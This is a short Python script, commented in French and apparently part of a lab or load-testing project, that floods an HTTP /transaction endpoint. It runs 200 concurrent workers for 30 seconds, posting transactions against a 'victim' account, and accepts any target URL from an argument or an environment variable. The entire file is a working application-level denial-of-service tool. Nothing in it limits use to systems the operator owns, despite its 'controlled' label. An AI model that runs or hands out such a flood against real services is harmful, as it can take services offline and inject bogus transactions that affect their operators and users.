#!/usr/bin/env python3
"""DoS applicatif contrôlé — owner: Gabriel.
Cible = 1er argument, sinon $TARGET, sinon localhost.
Ex : python3 attack/dos_flood.py http://10.0.0.20:8080
"""
import asyncio, os, sys, httpx

TARGET = sys.argv[1] if len(sys.argv) > 1 else os.getenv("TARGET", "http://127.0.0.1:8080")
CONCURRENCY = 200
DURATION_S = 30


async def worker(client, stop):
    payload = {"account_id": "victim", "amount": 1.0}
    while asyncio.get_event_loop().time() < stop:
        try:
            await client.post(f"{TARGET}/transaction", json=payload, timeout=2)
        except Exception:
            pass


async def main():
    stop = asyncio.get_event_loop().time() + DURATION_S
    async with httpx.AsyncClient() as client:
        await asyncio.gather(*[worker(client, stop) for _ in range(CONCURRENCY)])


if __name__ == "__main__":
    print(f"Flood {TARGET} | {CONCURRENCY} workers | {DURATION_S}s")
    asyncio.run(main())
